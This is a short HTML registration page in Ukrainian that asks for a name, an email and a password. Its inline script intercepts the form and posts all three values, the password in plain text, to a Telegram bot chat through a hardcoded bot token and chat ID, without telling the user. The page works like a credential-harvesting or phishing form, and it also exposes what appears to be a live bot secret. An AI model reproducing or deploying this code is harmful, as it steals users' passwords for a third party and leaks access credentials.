<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Форма реєстрації</title>
</head>
<body>
    <div class="container">
        <h2>Реєстрація</h2>
        <form id="tg">
            <div class="form-group">
                <label for="name">Ім'я:</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div class="form-group">
                <label for="email">Електронна пошта:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Пароль:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Зареєструватись</button>
        </form>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.6.7/dist/axios.min.js"></script>

    <script>
      const TOCEN = "7599305787:AAFqJT_GBj9t7t41eBXckywY17pICqAt3RQ"; // прибрані пробіли
      const CHAT_ID = "-1002486277719";
      const URI_API = `https://api.telegram.org/bot${TOCEN}/sendMessage`; // виправлено на sendMessage

      document.getElementById('tg').addEventListener('submit', function(e) {
        e.preventDefault();

        let message = `<b> Новий гравець </b>\n`; // виправлено на шаблонний рядок
        message += `<b> Iмя гравця: </b> ${this.name.value}\n`; // виправлено
        message += `<b> Пошта: </b> ${this.email.value}\n`; // виправлено
        message += `<b> Пароль: </b> ${this.password.value}`; // виправлено

        axios.post(URI_API, {
          chat_id: CHAT_ID, 
          parse_mode: 'HTML',
          text: message
        })
        .then(response => {
          console.log('Повідомлення надіслано:', response.data);
        })
        .catch(error => {
          console.error('Помилка при відправленні:', error);
        });
      });
    </script>
</body>
</html>
